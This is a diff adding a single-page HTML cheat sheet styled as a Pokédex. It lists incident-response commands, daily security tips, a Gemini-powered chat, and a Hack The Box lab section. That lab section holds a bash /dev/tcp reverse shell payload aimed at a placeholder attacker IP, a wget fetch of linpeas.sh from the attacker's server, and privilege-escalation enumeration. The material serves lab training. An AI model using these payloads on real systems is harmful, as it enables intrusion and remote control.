@@ -1,0 +1,545 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>WORM DEX — Incident Response &amp; HTB Pok&eacute;dex</title>
+<style>
+  *{box-sizing:border-box}
+  :root{--dark:#0f380f;--mid:#306230;--light:#8bac0f;--pale:#9bbc0f;--alert:#e8e83c;--bad:#ff5a3c;}
+  [hidden]{display:none !important}
+  body{margin:0;background:var(--dark);color:var(--dark);font-family:ui-monospace,"Cascadia Mono","Courier New",monospace;line-height:1.45}
+  .shell{max-width:880px;margin:0 auto;padding:12px}
+  header.gb{background:var(--pale);border:4px solid var(--dark);box-shadow:0 4px 0 var(--mid);padding:14px 12px;text-align:center}
+  header.gb h1{margin:0;font-size:34px;letter-spacing:6px}
+  header.gb .sub{margin:4px 0 0;letter-spacing:2px;font-weight:bold}
+  .ref-note{margin:10px 0 0;background:var(--dark);color:var(--pale);display:inline-block;padding:4px 10px;font-weight:bold;letter-spacing:1px}
+  section{margin-top:14px}
+  .panel{background:var(--pale);border:4px solid var(--dark);box-shadow:0 4px 0 var(--mid);padding:12px}
+  .panel h2{margin:0 0 8px;font-size:20px;letter-spacing:3px;border-bottom:3px solid var(--dark);padding-bottom:6px}
+  .panel h2 .tag{float:right;font-size:12px;letter-spacing:1px}
+  /* Daily intel */
+  #daily-tip{font-size:16px;margin:8px 0}
+  .fine{font-size:12px}
+  /* Controls: D-pad + A/B */
+  .controls{display:flex;justify-content:space-between;align-items:center;gap:12px;margin-top:12px}
+  .dpad{display:grid;grid-template-columns:34px 34px 34px;grid-template-rows:34px 34px 34px;gap:0}
+  .dpad button{background:var(--dark);color:var(--pale);border:2px solid var(--dark);font:inherit;cursor:pointer;padding:0}
+  .dpad button:active{background:var(--mid)}
+  .dpad .up{grid-column:2;grid-row:1}
+  .dpad .left{grid-column:1;grid-row:2}
+  .dpad .mid{grid-column:2;grid-row:2;background:var(--dark)}
+  .dpad .right{grid-column:3;grid-row:2}
+  .dpad .down{grid-column:2;grid-row:3}
+  .ab{display:flex;gap:14px;align-items:center}
+  .ab button{width:64px;height:64px;border-radius:50%;border:3px solid var(--dark);box-shadow:0 4px 0 var(--dark);background:var(--mid);color:var(--pale);font:inherit;font-weight:bold;cursor:pointer}
+  .ab button:active{transform:translateY(3px);box-shadow:0 1px 0 var(--dark)}
+  .ab .lbl{text-align:center;font-size:11px;font-weight:bold}
+  .big-btn{background:var(--dark);color:var(--pale);border:3px solid var(--dark);box-shadow:0 3px 0 var(--mid);padding:10px 18px;font:inherit;font-weight:bold;letter-spacing:2px;cursor:pointer}
+  .big-btn:active{transform:translateY(2px);box-shadow:0 1px 0 var(--mid)}
+  .small-btn{background:var(--dark);color:var(--pale);border:3px solid var(--dark);box-shadow:0 3px 0 var(--mid);padding:8px 12px;font:inherit;font-weight:bold;letter-spacing:1px;cursor:pointer}
+  .small-btn:active{transform:translateY(2px);box-shadow:0 1px 0 var(--mid)}
+  /* Pokédex */
+  .dex-sub{margin:16px 0 4px;font-size:16px;letter-spacing:3px;border-bottom:3px solid var(--dark);padding-bottom:4px}
+  .htb-note{font-size:13px;font-weight:bold;margin:8px 0 0}
+  .dex-card{background:var(--pale);border:4px solid var(--dark);margin:12px 0;padding:12px}
+  .dex-card.selected{outline:4px solid var(--mid);outline-offset:3px}
+  .dex-head{display:flex;flex-wrap:wrap;align-items:baseline;gap:10px;border-bottom:3px solid var(--dark);padding-bottom:6px;margin-bottom:8px}
+  .dex-no{font-weight:bold;font-size:18px}
+  .dex-head h3{margin:0;font-size:22px;letter-spacing:2px}
+  .dex-type{margin-left:auto;background:var(--dark);color:var(--pale);padding:2px 8px;font-size:12px;letter-spacing:2px}
+  .dex-desc{margin:6px 0}
+  .moves{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+  .moves h4{margin:0 0 4px;font-size:13px;letter-spacing:2px}
+  .move{display:block;background:var(--light);border:2px solid var(--dark);padding:5px 7px;margin:4px 0;font-size:13px;word-break:break-all;cursor:pointer}
+  .move:hover{background:var(--pale)}
+  .move.copied::after{content:"  \2713 COPIED";font-weight:bold}
+  .dex-note{font-size:13px;margin:8px 0 0;border-top:2px dashed var(--mid);padding-top:6px}
+  /* AI Terminal */
+  .key-row{display:flex;flex-wrap:wrap;gap:8px;align-items:center;margin:8px 0}
+  .key-row label{font-weight:bold;letter-spacing:1px;font-size:13px}
+  .key-row input{flex:1;min-width:180px;background:var(--light);border:3px solid var(--dark);padding:8px;font:inherit;color:inherit}
+  .chat-log{background:var(--dark);color:var(--pale);padding:10px;height:200px;overflow-y:auto;font-size:13px;line-height:1.55;white-space:pre-wrap;border:3px solid var(--dark);margin:8px 0}
+  .chat-log .you{color:var(--light)}
+  .chat-log .ai{color:var(--pale)}
+  .chat-log .thinking{opacity:.65}
+  .chat-row{display:flex;flex-wrap:wrap;gap:8px;align-items:center}
+  .chat-row input{flex:1;min-width:180px;background:var(--light);border:3px solid var(--dark);padding:10px;font:inherit;color:inherit}
+  #ai-terminal a{color:var(--dark);font-weight:bold}
+  footer{margin-top:14px;background:var(--pale);border:4px solid var(--dark);box-shadow:0 4px 0 var(--mid);padding:12px;font-size:13px}
+  @media (max-width:600px){
+    header.gb h1{font-size:26px;letter-spacing:3px}
+    .moves{grid-template-columns:1fr}
+    .chat-log{height:170px}
+    .ab button{width:54px;height:54px}
+  }
+</style>
+</head>
+<body>
+<div class="shell">
+
+  <header class="gb">
+    <h1>WORM DEX</h1>
+    <p class="sub">INCIDENT RESPONSE &amp; HTB POK&Eacute;DEX &middot; v2.0</p>
+    <p><span class="ref-note">REFERENCE CHEAT SHEET &mdash; NO TEST, NO GAME. COMMANDS ARE REAL &mdash; USE ONLY ON SYSTEMS YOU HAVE PERMISSION TO TEST.</span></p>
+  </header>
+
+  <noscript><p class="panel"><strong>This tool needs JavaScript enabled.</strong> The cheat-sheet copy buttons, the daily rotation, and the AI chat run in your browser. The only network call is the AI chat to Google's Gemini API &mdash; and only when you send a message with a key set.</p></noscript>
+
+  <section class="panel" id="controls" aria-label="Controls">
+    <h2>CONTROLS</h2>
+    <div class="controls">
+      <div class="dpad" aria-label="D-pad">
+        <button class="up" id="dpad-up" type="button" title="Previous section">&#9650;</button>
+        <button class="left" id="dpad-left" type="button" title="Previous Pok&eacute;dex entry">&#9664;</button>
+        <button class="mid" type="button" disabled aria-hidden="true"></button>
+        <button class="right" id="dpad-right" type="button" title="Next Pok&eacute;dex entry">&#9654;</button>
+        <button class="down" id="dpad-down" type="button" title="Next section">&#9660;</button>
+      </div>
+      <div class="ab">
+        <div><button id="btn-b" type="button">B</button><div class="lbl">INTEL</div></div>
+        <div><button id="btn-a" type="button">A</button><div class="lbl">AI CHAT</div></div>
+      </div>
+    </div>
+    <p class="fine">D-pad Up/Down: jump between sections (Daily Intel &rarr; Pok&eacute;dex &rarr; AI Terminal). Left/Right: cycle Pok&eacute;dex entries. A: AI Terminal. B: Daily Intel.</p>
+  </section>
+
+  <section class="panel" id="daily-intel" aria-label="Daily intel">
+    <h2>DAILY INTEL <span class="tag" id="daily-num"></span></h2>
+    <p class="fine" id="daily-date"></p>
+    <p id="daily-tip"></p>
+    <p class="fine">Rotates daily from a built-in bank of real-world tips &mdash; no live feed, no network calls. Changes at midnight.</p>
+  </section>
+
+  <section class="panel" id="pokedex" aria-label="Pok&eacute;dex entries">
+    <h2>POK&Eacute;DEX <span class="tag">12 ENTRIES &middot; CLICK A MOVE TO COPY IT</span></h2>
+
+    <h3 class="dex-sub">INCIDENT RESPONSE</h3>
+
+    <article class="dex-card" id="dex-001">
+      <div class="dex-head"><span class="dex-no">#001</span><h3>DISCONNECT</h3><span class="dex-type">NETWORK</span></div>
+      <p class="dex-desc">First move in any live infection: cut the network so the worm can't spread to other machines or phone home. Do it at the OS level &mdash; closing apps is not enough.</p>
+      <div class="moves">
+        <div><h4>LINUX</h4>
+          <code class="move" title="Click to copy">ip link set eth0 down</code>
+          <code class="move" title="Click to copy">nmcli dev disconnect eth0</code>
+          <code class="move" title="Click to copy">ip a</code>
+          <code class="move" title="Click to copy">nmcli radio wifi off</code>
+        </div>
+        <div><h4>POWERSHELL</h4>
+          <code class="move" title="Click to copy">Get-NetAdapter | Disable-NetAdapter -Confirm:$false</code>
+          <code class="move" title="Click to copy">netsh interface set interface "Wi-Fi" admin=disable</code>
+        </div>
+      </div>
+      <p class="dex-note">NOTE: eth0 is an example &mdash; use the real interface name. List interfaces first with <code>ip a</code> (Linux) or <code>Get-NetAdapter</code> (PowerShell).</p>
+    </article>
+
+    <article class="dex-card" id="dex-002">
+      <div class="dex-head"><span class="dex-no">#002</span><h3>TERMINATE</h3><span class="dex-type">PROCESS</span></div>
+      <p class="dex-desc">Kill the malicious process so it stops doing damage. Find it first with a process list &mdash; never kill by guessing a name.</p>
+      <div class="moves">
+        <div><h4>LINUX</h4>
+          <code class="move" title="Click to copy">top</code>
+          <code class="move" title="Click to copy">htop</code>
+          <code class="move" title="Click to copy">pkill -9 &lt;name&gt;</code>
+          <code class="move" title="Click to copy">killall -9 &lt;name&gt;</code>
+        </div>
+        <div><h4>POWERSHELL</h4>
+          <code class="move" title="Click to copy">Get-Process</code>
+          <code class="move" title="Click to copy">Stop-Process -Name &lt;name&gt; -Force</code>
+        </div>
+      </div>
+      <p class="dex-note">NOTE: <code>-9</code> / <code>-Force</code> kills immediately with no cleanup &mdash; that is the point during an incident, but it can lose unsaved work inside the killed process.</p>
+    </article>
+
+    <article class="dex-card" id="dex-003">
+      <div class="dex-head"><span class="dex-no">#003</span><h3>HARVEST</h3><span class="dex-type">FORENSICS</span></div>
+      <p class="dex-desc">Grab logs and connection state BEFORE they roll over or the attacker wipes them. Evidence first, cleanup later.</p>
+      <div class="moves">
+        <div><h4>LINUX</h4>
+          <code class="move" title="Click to copy">dmesg | tail -50</code>
+          <code class="move" title="Click to copy">journalctl -n 100</code>
+          <code class="move" title="Click to copy">ss -tupn</code>
+          <code class="move" title="Click to copy">netstat -tupn</code>
+        </div>
+        <div><h4>POWERSHELL</h4>
+          <code class="move" title="Click to copy">Get-WinEvent -LogName System -MaxEvents 100</code>
+          <code class="move" title="Click to copy">Get-NetTCPConnection</code>
+        </div>
+      </div>
+      <p class="dex-note">NOTE: save output to a file (add <code>&gt; evidence.txt</code>) so it survives a reboot. <code>ss</code> is the modern replacement for <code>netstat</code> on Linux.</p>
+    </article>
+
+    <article class="dex-card" id="dex-004">
+      <div class="dex-head"><span class="dex-no">#004</span><h3>BARRICADE</h3><span class="dex-type">FIREWALL</span></div>
+      <p class="dex-desc">Block the worm's way back in at the firewall. Inbound first, then outbound &mdash; a worm that can't call home can't get new orders.</p>
+      <div class="moves">
+        <div><h4>LINUX</h4>
+          <code class="move" title="Click to copy">iptables -A INPUT -j DROP</code>
+          <code class="move" title="Click to copy">ufw deny in</code>
+        </div>
+        <div><h4>POWERSHELL</h4>
+          <code class="move" title="Click to copy">New-NetFirewallRule -DisplayName "Block worm" -Direction Inbound -Action Block</code>
+          <code class="move" title="Click to copy">New-NetFirewallRule -DisplayName "Block worm out" -Direction Outbound -Action Block</code>
+        </div>
+      </div>
+      <p class="dex-note">NOTE: <code>iptables -A INPUT -j DROP</code> is a blunt instrument &mdash; it blocks ALL inbound traffic, including legitimate access. Use it to stop the bleeding, then replace it with precise rules.</p>
+    </article>
+
+    <article class="dex-card" id="dex-005">
+      <div class="dex-head"><span class="dex-no">#005</span><h3>ROTATE</h3><span class="dex-type">CREDENTIALS</span></div>
+      <p class="dex-desc">Assume every password and key on the infected machine is stolen. Change them from a known-clean device, starting with the most privileged accounts.</p>
+      <div class="moves">
+        <div><h4>LINUX</h4>
+          <code class="move" title="Click to copy">passwd</code>
+          <code class="move" title="Click to copy">ssh-keygen -t ed25519 -f ~/.ssh/id_ed25519_new</code>
+        </div>
+        <div><h4>POWERSHELL</h4>
+          <code class="move" title="Click to copy">net user &lt;username&gt; *</code>
+          <code class="move" title="Click to copy">Set-LocalUser -Name &lt;user&gt; -Password (Read-Host -AsSecureString)</code>
+        </div>
+      </div>
+      <p class="dex-note">NOTE: rotate from a clean machine &mdash; changing passwords on the infected host can hand the new ones straight to the attacker. Revoke API keys and sessions too, not just passwords.</p>
+    </article>
+
+    <h3 class="dex-sub">HACK THE BOX</h3>
+    <p class="htb-note">For Hack The Box lab machines and systems you have permission to test only. <code>&lt;IP&gt;</code> and <code>&lt;YOUR-IP&gt;</code> are placeholders &mdash; replace them with the real addresses before running anything.</p>
+
+    <article class="dex-card" id="dex-006">
+      <div class="dex-head"><span class="dex-no">#006</span><h3>RECON</h3><span class="dex-type">NETWORK</span></div>
+      <p class="dex-desc">First touch on a Hack The Box machine: find what's listening before you guess anything. A quick service scan, then a full-port sweep so nothing hides above port 1000.</p>
+      <div class="moves">
+        <div><h4>QUICK SCAN</h4>
+          <code class="move" title="Click to copy">nmap -sC -sV -oA nmap/scan &lt;IP&gt;</code>
+        </div>
+        <div><h4>FULL PORTS</h4>
+          <code class="move" title="Click to copy">nmap -p- --min-rate 1000 -oA nmap/all &lt;IP&gt;</code>
+        </div>
+      </div>
+      <p class="dex-note">NOTE: <code>&lt;IP&gt;</code> is the target machine's IP &mdash; replace it with the real one. <code>-oA</code> saves the scan output in all formats under <code>nmap/</code>.</p>
+    </article>
+
+    <article class="dex-card" id="dex-007">
+      <div class="dex-head"><span class="dex-no">#007</span><h3>WEB ENUM</h3><span class="dex-type">WEB</span></div>
+      <p class="dex-desc">A web server is listening &mdash; go find its hidden pages and directories. Directory brute-forcing with a wordlist is the standard first move.</p>
+      <div class="moves">
+        <div><h4>GOBUSTER</h4>
+          <code class="move" title="Click to copy">gobuster dir -u http://&lt;IP&gt;/ -w /usr/share/wordlists/dirb/common.txt</code>
+        </div>
+        <div><h4>FFUF</h4>
+          <code class="move" title="Click to copy">ffuf -u http://&lt;IP&gt;/FUZZ -w /usr/share/wordlists/dirb/common.txt</code>
+        </div>
+      </div>
+      <p class="dex-note">NOTE: <code>FUZZ</code> is ffuf's keyword &mdash; it gets replaced by each wordlist entry in turn.</p>
+    </article>
+
+    <article class="dex-card" id="dex-008">
+      <div class="dex-head"><span class="dex-no">#008</span><h3>SMB ENUM</h3><span class="dex-type">NETWORK</span></div>
+      <p class="dex-desc">SMB shares are a classic way in on Windows boxes. List the shares anonymously first, then connect to any that look interesting.</p>
+      <div class="moves">
+        <div><h4>LIST SHARES</h4>
+          <code class="move" title="Click to copy">smbclient -L //&lt;IP&gt; -N</code>
+        </div>
+        <div><h4>CONNECT</h4>
+          <code class="move" title="Click to copy">smbclient //&lt;IP&gt;/&lt;share&gt; -N</code>
+        </div>
+      </div>
+      <p class="dex-note">NOTE: <code>-N</code> means no password (anonymous). Replace <code>&lt;share&gt;</code> with a real share name from the listing.</p>
+    </article>
+
+    <article class="dex-card" id="dex-009">
+      <div class="dex-head"><span class="dex-no">#009</span><h3>REVERSE SHELL</h3><span class="dex-type">SHELL</span></div>
+      <p class="dex-desc">You got code execution &mdash; now catch a shell back on your machine. Start the listener first, then trigger the payload on the target.</p>
+      <div class="moves">
+        <div><h4>LISTENER (YOUR MACHINE)</h4>
+          <code class="move" title="Click to copy">nc -lvnp 4444</code>
+        </div>
+        <div><h4>PAYLOAD (TARGET)</h4>
+          <code class="move" title="Click to copy">bash -i &gt;&amp; /dev/tcp/&lt;YOUR-IP&gt;/4444 0&gt;&amp;1</code>
+        </div>
+      </div>
+      <p class="dex-note">NOTE: <code>&lt;YOUR-IP&gt;</code> is YOUR attack machine's IP (the one running the listener), not the target's. Use your HTB VPN IP.</p>
+    </article>
+
+    <article class="dex-card" id="dex-010">
+      <div class="dex-head"><span class="dex-no">#010</span><h3>STABILIZE</h3><span class="dex-type">SHELL</span></div>
+      <p class="dex-desc">A raw reverse shell is fragile &mdash; no tab-completion, and Ctrl+C kills it. Stabilize it into a proper terminal so you can actually work.</p>
+      <div class="moves">
+        <div><h4>PTY SHELL</h4>
+          <code class="move" title="Click to copy">python3 -c 'import pty; pty.spawn("/bin/bash")'</code>
+        </div>
+        <div><h4>TERM + RAW</h4>
+          <code class="move" title="Click to copy">export TERM=xterm</code>
+          <code class="move" title="Click to copy">stty raw -echo; fg</code>
+        </div>
+      </div>
+      <p class="dex-note">NOTE: after the PTY spawn, press Ctrl+Z to background the shell, run <code>stty raw -echo; fg</code> on your machine, then press Enter twice.</p>
+    </article>
+
+    <article class="dex-card" id="dex-011">
+      <div class="dex-head"><span class="dex-no">#011</span><h3>PRIVESC ENUM</h3><span class="dex-type">PRIVESC</span></div>
+      <p class="dex-desc">You're in as a low user &mdash; now hunt for a way up. Check what sudo lets you run, look for SUID binaries, and let LinPEAS do a full sweep.</p>
+      <div class="moves">
+        <div><h4>SUDO + SUID</h4>
+          <code class="move" title="Click to copy">sudo -l</code>
+          <code class="move" title="Click to copy">find / -perm -4000 -type f 2&gt;/dev/null</code>
+        </div>
+        <div><h4>LINPEAS</h4>
+          <code class="move" title="Click to copy">./linpeas.sh</code>
+        </div>
+      </div>
+      <p class="dex-note">NOTE: get linpeas.sh onto the box first (see #012 TRANSFER). Read its output &mdash; it highlights the interesting findings for you.</p>
+    </article>
+
+    <article class="dex-card" id="dex-012">
+      <div class="dex-head"><span class="dex-no">#012</span><h3>TRANSFER</h3><span class="dex-type">TRANSFER</span></div>
+      <p class="dex-desc">Need a tool on the target (like linpeas.sh)? Serve it from your machine over HTTP and pull it down on the target.</p>
+      <div class="moves">
+        <div><h4>ATTACKER (SERVE)</h4>
+          <code class="move" title="Click to copy">python3 -m http.server 8000</code>
+        </div>
+        <div><h4>TARGET (FETCH)</h4>
+          <code class="move" title="Click to copy">wget http://&lt;YOUR-IP&gt;:8000/linpeas.sh</code>
+        </div>
+      </div>
+      <p class="dex-note">NOTE: run the server in the folder containing the file. <code>&lt;YOUR-IP&gt;</code> is your attack machine's IP.</p>
+    </article>
+  </section>
+
+  <section class="panel" id="ai-terminal" aria-label="AI Terminal">
+    <h2>AI TERMINAL <span class="tag">GEMINI 2.5 FLASH</span></h2>
+    <p class="fine">The Dex entries and Daily Intel work offline. The AI chat is the only part that needs the internet &mdash; and a Gemini API key.</p>
+    <div class="key-row">
+      <label for="ai-key">GEMINI API KEY</label>
+      <input type="password" id="ai-key" placeholder="Paste your Gemini API key" autocomplete="off" spellcheck="false">
+      <button class="small-btn" id="ai-save-key" type="button">SAVE KEY</button>
+      <button class="small-btn" id="ai-forget-key" type="button">FORGET KEY</button>
+    </div>
+    <p class="fine" id="ai-key-status">No key saved yet.</p>
+    <p class="fine">Paste your Gemini API key &mdash; it stays in this browser only. Get a key at <a href="https://aistudio.google.com/" target="_blank" rel="noopener">Google AI Studio</a>. The key is never written into this file and is only sent to Google's Gemini API when you chat.</p>
+    <div class="chat-log" id="chat-log" aria-live="polite">
+      <div class="ai">AI: Ask me anything about Hack The Box labs or incident response. Paste your Gemini API key above first &mdash; the chat needs a key to work.</div>
+    </div>
+    <div class="chat-row">
+      <input type="text" id="chat-input" placeholder="Ask the AI... e.g. how do I stabilize a reverse shell?" autocomplete="off">
+      <button class="big-btn" id="chat-send" type="button">SEND</button>
+      <button class="small-btn" id="chat-clear" type="button">CLEAR CHAT</button>
+    </div>
+  </section>
+
+  <footer>
+    <strong>WORM DEX v2.0</strong> &mdash; a reference cheat sheet. Every command shown is a real command; run commands only on systems you own or have permission to test. Entries and Daily Intel work fully offline &mdash; no network calls, no tracking, no external assets. The AI Terminal is the only part that needs the internet: it calls Google's Gemini API only when you send a message, using a key stored in this browser only.
+  </footer>
+
+</div>
+
+<script>
+(function(){
+"use strict";
+
+/* ---------- Daily rotation: deterministic, changes at local midnight ---------- */
+var TIPS=[
+"Phishing check: read the sender's domain character by character. Unexpected urgency plus a link or attachment means stop and verify through a separate channel.",
+"Turn on multi-factor authentication everywhere it exists. App-based codes or hardware keys beat SMS codes, which can be intercepted.",
+"Install operating system and app updates promptly. Most exploited flaws are old ones that already have a patch.",
+"Use a password manager and give every account its own unique password. Reusing one password lets a single breach open every door.",
+"Keep backups that are offline or immutable, and actually test restoring from them. A backup you have never restored is a hope, not a plan.",
+"Practice least privilege: give accounts and apps only the access they need to do their job, nothing more.",
+"Skim your login logs weekly for failed attempts and logins at odd hours. A quiet account suddenly active at 3 a.m. deserves a look.",
+"Never plug in a found USB drive. Disable autorun, and scan any drive you must use on an isolated machine first.",
+"Treat public Wi-Fi as hostile. Use a VPN for anything sensitive, or use your phone's hotspot instead.",
+"Lock your screen every time you walk away, and set auto-lock to a minute or two. An unlocked laptop is an open door.",
+"Don't open an unexpected attachment, even from a known sender. Their account may be compromised - verify first.",
+"Install software only from official stores and vendor sites. Cracked software is one of the oldest malware delivery tricks.",
+"Keep browser extensions minimal. Remove the ones you don't use; each one is code running on every page you visit.",
+"Never enable macros or run scripts from a document you didn't expect. Office macros remain a classic infection path.",
+"Put smart-home and IoT devices on a separate network from your work machines. A hacked camera shouldn't reach your laptop.",
+"Do daily work from a standard account, not an admin account. Malware inherits whatever privileges you have.",
+"Know your incident plan before you need it: who to call, what to isolate first, and where the backups live.",
+"Keep your antivirus or endpoint protection running and updated. Don't disable it to make something work - find the real fix.",
+"Never paste passwords, API keys, or tokens into chats, tickets, or public code. Secrets in chat are secrets leaked.",
+"Check the sharing settings on your cloud drives. 'Anyone with the link' means anyone - treat it as public.",
+"Patch your router firmware and change its default admin password. Your router is a computer too, and attackers know it.",
+"Hover over a link before you click it and read the real destination. A display name is not a URL.",
+"After an incident, preserve evidence before wiping anything. Capture logs first - a wiped machine tells no story.",
+"Long passphrases beat short complicated passwords. Length is the strongest factor; four random words are hard to crack and easy to remember.",
+"If a service offers passkeys, use them. They resist phishing because there is no password to steal or fake.",
+"Verify unusual requests out of band. A gift-card or wire-transfer request from your boss's email deserves a phone call, not a quick reply.",
+"Follow the 3-2-1 backup rule: three copies, two different media types, one copy offsite.",
+"Watch for lookalike domains: a single swapped letter (rnicrosoft, g00gle) is a classic phishing trick.",
+"Change the default credentials on every networked device you own - printers, cameras, routers, all of them.",
+"Spend five minutes a month reviewing recent phishing examples. Short, frequent practice beats one annual lecture.",
+"Enable automatic updates for your browser. It is the most attacked application on most machines.",
+"After containment, change passwords from a known-clean device - never from the infected machine, which may hand the new ones straight to the attacker."
+];
+
+function hashStr(s){var h=0;for(var i=0;i<s.length;i++){h=(h*31+s.charCodeAt(i))>>>0;}return h;}
+function pad(n){return n<10?"0"+n:""+n;}
+function todayKey(){var d=new Date();return d.getFullYear()+"-"+pad(d.getMonth()+1)+"-"+pad(d.getDate());}
+function dayNumber(){var d=new Date();var t=new Date(d.getFullYear(),d.getMonth(),d.getDate());return Math.floor(t.getTime()/86400000);}
+
+var dateKey=todayKey();
+var tipIdx=dayNumber()%TIPS.length;
+var dexSel=-1;
+
+function $(id){return document.getElementById(id);}
+
+function copyText(t){
+  try{
+    if(navigator.clipboard&&navigator.clipboard.writeText){navigator.clipboard.writeText(t);return;}
+  }catch(e){}
+  try{
+    var ta=document.createElement("textarea");
+    ta.value=t;
+    ta.style.position="fixed";
+    ta.style.opacity="0";
+    document.body.appendChild(ta);
+    ta.select();
+    document.execCommand("copy");
+    document.body.removeChild(ta);
+  }catch(e2){}
+}
+
+function selectDex(n){
+  var cards=document.querySelectorAll(".dex-card");
+  if(!cards.length){return;}
+  dexSel=((n%cards.length)+cards.length)%cards.length;
+  for(var i=0;i<cards.length;i++){cards[i].classList.remove("selected");}
+  cards[dexSel].classList.add("selected");
+  if(cards[dexSel].scrollIntoView){
+    try{cards[dexSel].scrollIntoView({block:"nearest",behavior:"smooth"});}catch(e){cards[dexSel].scrollIntoView();}
+  }
+}
+
+/* ---------- Section navigation (D-pad) ---------- */
+var SECTIONS=["daily-intel","pokedex","ai-terminal"];
+var secIdx=0;
+function goSection(i){
+  secIdx=((i%SECTIONS.length)+SECTIONS.length)%SECTIONS.length;
+  var el=$(SECTIONS[secIdx]);
+  if(el&&el.scrollIntoView){
+    try{el.scrollIntoView({behavior:"smooth"});}catch(e){el.scrollIntoView();}
+  }
+}
+
+/* ---------- AI Terminal (Google Gemini) ---------- */
+var AI_LS_KEY="worm-dex-gemini-key";
+var AI_MODEL="gemini-2.5-flash";
+var AI_SYS="Answer as a concise cybersecurity helper for Hack The Box labs and incident response. Give real commands. Keep answers short and command-focused. Never invent commands or flags. If unsure, say so.";
+var aiBusy=false;
+
+function aiKeyVal(){var v=$("ai-key").value;return v?v.trim():"";}
+function aiStatus(msg){$("ai-key-status").textContent=msg;}
+
+function aiLog(text,cls){
+  var log=$("chat-log");
+  var div=document.createElement("div");
+  if(cls){div.className=cls;}
+  div.textContent=text;
+  log.appendChild(div);
+  log.scrollTop=log.scrollHeight;
+}
+
+function aiSaveKey(){
+  var k=aiKeyVal();
+  if(!k){aiStatus("Paste a key first.");return;}
+  try{localStorage.setItem(AI_LS_KEY,k);}catch(e){}
+  aiStatus("Key saved in this browser only.");
+}
+
+function aiForgetKey(){
+  try{localStorage.removeItem(AI_LS_KEY);}catch(e){}
+  $("ai-key").value="";
+  aiStatus("Key forgotten. The chat needs a key to work.");
+}
+
+function aiSend(){
+  var input=$("chat-input");
+  var text=input.value.trim();
+  if(!text){return;}
+  var key=aiKeyVal();
+  aiLog("YOU: "+text,"you");
+  input.value="";
+  if(!key){
+    aiLog("AI: I need a Gemini API key first. Paste yours in the key field above and hit SAVE KEY — it stays in this browser only.","ai");
+    return;
+  }
+  if(aiBusy){return;}
+  aiBusy=true;
+  $("chat-send").disabled=true;
+  var thinking=document.createElement("div");
+  thinking.className="ai thinking";
+  thinking.textContent="AI: thinking...";
+  $("chat-log").appendChild(thinking);
+  $("chat-log").scrollTop=$("chat-log").scrollHeight;
+  var url="https://generativelanguage.googleapis.com/v1beta/models/"+AI_MODEL+":generateContent?key="+encodeURIComponent(key);
+  fetch(url,{
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({
+      systemInstruction:{parts:[{text:AI_SYS}]},
+      contents:[{parts:[{text:text}]}]
+    })
+  }).then(function(resp){
+    return resp.json().then(function(data){
+      return {ok:resp.ok,status:resp.status,data:data};
+    });
+  }).then(function(res){
+    thinking.remove();
+    if(!res.ok){
+      var msg="API error ("+res.status+")";
+      if(res.data&&res.data.error&&res.data.error.message){msg+=": "+res.data.error.message;}
+      aiLog("AI: "+msg+". Check the key, then try again.","ai");
+    }else{
+      var out="";
+      try{out=res.data.candidates[0].content.parts.map(function(p){return p.text||"";}).join("");}catch(e){}
+      aiLog("AI: "+(out||"(empty reply — try again.)"),"ai");
+    }
+  }).catch(function(err){
+    thinking.remove();
+    aiLog("AI: Could not reach Google ("+(err&&err.message?err.message:"network error")+"). Check your connection and try again.","ai");
+  }).finally(function(){
+    aiBusy=false;
+    $("chat-send").disabled=false;
+    $("chat-input").focus();
+  });
+}
+
+/* ---------- init ---------- */
+$("daily-date").textContent="DATE: "+dateKey;
+$("daily-num").textContent="INTEL #"+(tipIdx+1)+" OF "+TIPS.length;
+$("daily-tip").textContent=TIPS[tipIdx];
+
+try{
+  var saved=localStorage.getItem(AI_LS_KEY);
+  if(saved){$("ai-key").value=saved;aiStatus("Key loaded from this browser.");}
+}catch(e){}
+
+$("btn-a").addEventListener("click",function(){goSection(2);});
+$("btn-b").addEventListener("click",function(){goSection(0);});
+$("dpad-up").addEventListener("click",function(){goSection(secIdx-1);});
+$("dpad-down").addEventListener("click",function(){goSection(secIdx+1);});
+$("dpad-left").addEventListener("click",function(){selectDex(dexSel<0?0:dexSel-1);});
+$("dpad-right").addEventListener("click",function(){selectDex(dexSel<0?0:dexSel+1);});
+
+$("ai-save-key").addEventListener("click",aiSaveKey);
+$("ai-forget-key").addEventListener("click",aiForgetKey);
+$("chat-send").addEventListener("click",aiSend);
+$("chat-clear").addEventListener("click",function(){
+  $("chat-log").innerHTML='<div class="ai">AI: Chat cleared. Ask me anything about Hack The Box labs or incident response.</div>';
+});
+$("chat-input").addEventListener("keydown",function(e){if(e.key==="Enter"){aiSend();}});
+
+var moves=document.querySelectorAll(".move");
+for(var m=0;m<moves.length;m++){
+  moves[m].addEventListener("click",function(){
+    copyText(this.textContent);
+    var el=this;
+    el.classList.add("copied");
+    setTimeout(function(){el.classList.remove("copied");},900);
+  });
+}
+})();
+</script>
+</body>
+</html>
